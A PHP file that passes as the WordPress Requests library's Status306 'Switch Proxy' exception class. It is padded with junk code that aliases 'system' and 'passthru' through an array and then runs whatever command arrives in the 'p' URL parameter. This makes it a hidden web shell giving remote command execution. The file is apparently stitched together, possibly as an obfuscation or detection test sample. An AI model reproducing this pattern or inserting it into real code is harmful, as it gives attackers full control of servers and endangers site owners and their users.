<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Exception for 306 Switch Proxy responses
 *
 * @package Requests\Exceptions
 */

namespace WpOrg\Requests\Exception\Http;

use WpOrg\Requests\Exception\Http;

/**
 * Exception for 306 Switch Proxy responses
 *
 * @package Requests\Exceptions
 */
final class Status306 extends Http {
	/**
	 * HTTP status code
	 *
	 * @var integer
	 */
	protected $code = 306;

	/**
	 * Reason phrase
	 *
	 * @var string
	 */
	protected $reason = 'Switch Proxy';
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>